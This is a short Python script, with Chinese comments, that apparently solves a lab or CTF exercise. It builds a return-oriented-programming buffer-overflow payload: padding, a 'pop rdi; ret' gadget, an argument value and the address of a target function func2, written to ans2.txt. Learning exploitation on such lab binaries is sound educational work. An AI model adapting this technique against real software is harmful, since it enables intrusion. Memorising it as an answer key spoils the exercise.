import sys

# 1. 基础偏移 (同 Problem 1)
# buffer @ rbp-8, ret @ rbp+8 => 16 bytes
padding = b'A' * 16

# 2. Gadget: pop rdi; ret
# 地址在 4012c7
pop_rdi_addr = b'\xc7\x12\x40\x00\x00\x00\x00\x00'

# 3. 参数: 0x3f8
# 也要写成 64位 小端序
arg_val = b'\xf8\x03\x00\x00\x00\x00\x00\x00'

# 4. 目标函数: func2
# 地址在 401216
func2_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00'

# 5. 组合 Payload
payload = padding + pop_rdi_addr + arg_val + func2_addr

# 写入
with open('ans2.txt', 'wb') as f:
    f.write(payload)

print(f"Payload generated! Length: {len(payload)}")